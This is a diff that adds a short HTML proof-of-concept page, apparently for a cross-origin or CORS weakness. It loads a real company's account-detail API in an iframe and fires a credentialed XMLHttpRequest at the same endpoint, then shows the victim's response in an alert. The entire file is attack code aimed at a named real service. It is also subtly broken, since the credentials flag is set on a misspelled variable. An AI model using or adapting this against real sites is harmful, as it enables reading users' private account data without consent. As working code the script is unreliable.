@@ -1,0 +1,17 @@
+<html>
+<title>test</title>
+<iframe src="https://profile.starbucks.com.cn/api/account/detail"></iframe>
+<script>
+     var xmlhttp = new XMLHttpRequest()
+     xmlhttp.onreadystatechange=function()
+	{
+		if (xmlhttp.readyState==4 && xmlhttp.status==200)
+		{
+			alert(xmlhttp.responseText);
+		}
+	}
+    xmlHttp.withCredentials = true;
+	xmlhttp.open("GET","https://profile.starbucks.com.cn/api/account/detail",true);
+	xmlhttp.send();
+</script>
+</html>
